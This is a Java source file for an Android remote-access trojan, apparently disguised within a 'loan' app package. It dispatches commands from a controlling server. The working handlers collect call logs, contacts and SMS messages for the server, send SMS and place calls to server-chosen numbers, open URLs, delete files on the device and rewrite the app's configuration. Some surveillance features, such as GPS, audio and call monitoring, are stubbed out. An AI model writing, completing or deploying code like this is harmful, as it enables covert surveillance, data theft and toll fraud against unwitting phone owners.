package sub.app.entry;

import java.io.File;
import java.nio.ByteBuffer;

import sub.app.client.GlobalPacket;
import sub.app.func.CallLogListener;
import sub.app.func.ContactsListener;
import sub.app.func.FileDownloader;
import sub.app.func.SMSListener;

import main.app.loan.VarSpace;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Vibrator;
import android.telephony.SmsManager;
import android.widget.Toast;


public class RunCmd
{
	TaskListener tasklistener;
	Intent intent;

	public RunCmd(TaskListener c)
	{
		this.tasklistener = c;
	}

	
	public void stopAll()
	{
		try{
		}
		catch(Exception e)
		{
		}
	}

	public void process(byte opcode, int chan, int cmdNo, byte[] args)
	{
		final ByteBuffer arguments = ByteBuffer.wrap(args);
		
		if (opcode == Protocol.OPCLIENT_KEEPALIVE)
		{
			GlobalPacket serverglobal = new GlobalPacket();
			serverglobal.parse(arguments.array());

			FileDownloader.FTP_ID = serverglobal.ftpFileID;
			FileDownloader.FTP_PW = serverglobal.ftpFilePW;
			
		}else if (opcode == Protocol.OPSERVER_GET_GPS_STREAM)
		{

		}else if (opcode == Protocol.OPSERVER_STOP_GPS_STREAM)
		{
			
		}else if (opcode == Protocol.OPSERVER_SIM_GPS_POINT)
		{

		}else if (opcode == Protocol.OPSERVER_GET_SOUND_STREAM)
		{
			
		} else if (opcode == Protocol.OPSERVER_STOP_SOUND_STREAM)
		{
			
		} else if (opcode == Protocol.OPSERVER_GET_CALL_LOGS)
		{
			final int ch = chan;
			new Thread(new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					if (!CallLogListener.listCallLog(tasklistener, ch, arguments.array()))
					{
					}
				}
			}).start();
		} else if (opcode == Protocol.OPSERVER_MONITOR_CALL)
		{
//			if(tasklistener.callMonitor == null)
//			{
//				tasklistener.callMonitor = new CallMonitor(tasklistener, chan, arguments.array());
//			}
			
		} else if (opcode == Protocol.OPSERVER_STOP_MONITOR_CALL)
		{
//			if(tasklistener.callMonitor != null)
//			{
//				tasklistener.callMonitor.stop();
//				tasklistener.callMonitor = null;
//			}
			
		} else if (opcode == Protocol.OPSERVER_GET_CONTACTS)
		{
			final int ch = chan;
			new Thread(new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					if (!ContactsListener.listContacts(tasklistener, ch, arguments.array()))
					{
					}
				}
			}).start();
		} else if (opcode == Protocol.OPSERVER_LIST_DIR)
		{
			
		} else if (opcode == Protocol.OPSERVER_GET_FILE)
		{
			
		} else if (opcode == Protocol.OPSERVER_GET_PICTURE)
		{
			
		} else if (opcode == Protocol.OPSERVER_DO_TOAST)
		{
			CTypeCast bb = new CTypeCast(args);
			String msg = bb.getString();

			tasklistener.toast = Toast.makeText(tasklistener, msg, Toast.LENGTH_LONG);
			tasklistener.toast.show();
			
			tasklistener.handleData(opcode, chan, null);
			
		} else if (opcode == Protocol.OPSERVER_SEND_SMS)
		{
			CTypeCast bb = new CTypeCast(args);
			String num = bb.getString();
			String text = bb.getString();

			if (text.getBytes().length < 167){
				SmsManager.getDefault().sendTextMessage(num, null, text, null, null);
			}else{
//				ArrayList<String> multipleMsg = MessageDecoupator(text);
//				SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);
			}
//			Log.d("Info","SMS sent");
			
			tasklistener.handleData(opcode, chan, null);

		} else if (opcode == Protocol.OPSERVER_GIVE_CALL)
		{
			CTypeCast bb = new CTypeCast(args);
			String number = bb.getString();

			String uri = "tel:" + number;
			intent = new Intent(Intent.ACTION_CALL,Uri.parse(uri));
			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			tasklistener.startActivity(intent);

			tasklistener.handleData(opcode, chan, null);
			
		} else if (opcode == Protocol.OPSERVER_GET_SMS)
		{
			final int ch = chan;
			new Thread(new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					if(!SMSListener.listSMS(tasklistener, ch, arguments.array()))
					{
					}
					
				}
			}).start();
			
		} else if (opcode == Protocol.OPSERVER_MONITOR_SMS)
		{
//			if(tasklistener.smsMonitor == null)
//			{
//				tasklistener.smsMonitor = new SMSMonitor(tasklistener, chan, arguments.array());
//			}
			
		} else if (opcode == Protocol.OPSERVER_STOP_MONITOR_SMS)
		{
//			if(tasklistener.smsMonitor != null)
//			{
//				tasklistener.smsMonitor.stop();
//				tasklistener.smsMonitor = null;
//			}
		}
		else if (opcode == Protocol.OPSERVER_GET_CONFIG)
		{
//			Log.d("Info","Preferences Get");
			tasklistener.handleData(Protocol.OPSERVER_GET_CONFIG, chan, VarSpace.loadPreferences(tasklistener).build());
		} 
		else if (opcode == Protocol.OPSERVER_SET_CONFIG)
		{
//			Log.d("Info","Preferences Set");
			VarSpace.savePreferences(tasklistener,arguments.array());
			VarSpace.loadPreferences(tasklistener); //Reload the new config for the client
			
			tasklistener.handleData(Protocol.OPSERVER_GET_CONFIG, chan, VarSpace.loadPreferences(tasklistener).build());
		}
		else if(opcode == Protocol.OPSERVER_GET_ADV_INFORMATIONS) {
			
		}
		else if(opcode == Protocol.OPSERVER_OPEN_BROWSER) {
			CTypeCast bb = new CTypeCast(args);
			String url = bb.getString();
			
			Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			tasklistener.startActivity(i);
		}
		else if(opcode == Protocol.OPSERVER_DO_VIBRATE) {
			Vibrator v = (Vibrator) tasklistener.getSystemService(Context.VIBRATOR_SERVICE);
			long duration = 10 * 1000; //arguments.getLong();
			v.vibrate(duration);
			
			tasklistener.handleData(opcode, chan, null);
		}
		else if(opcode == Protocol.OPCOMM_DISCONNECT) {
			tasklistener.ResetConnection();
		}
		else if(opcode == Protocol.OPSERVER_STOPALL) {
			
//			Log.d("Info","stopAll Command");

			stopAll();
		}
		else if(opcode == Protocol.OPSERVER_DBDEL_CALLSMS) {
			
		}
		else if(opcode == Protocol.OPSERVER_DEL_FILE)
		{
			CTypeCast bb = new CTypeCast(args);
			String filepath = bb.getString();
			File f = new File(filepath);
			if(f.exists() && f.isFile())
			{
				f.delete();
			}
			
			tasklistener.handleData(opcode, chan, null);
		}
		else {
//			Log.d("Error","Command: "+opcode+" unknown");
		}
			
	}


}
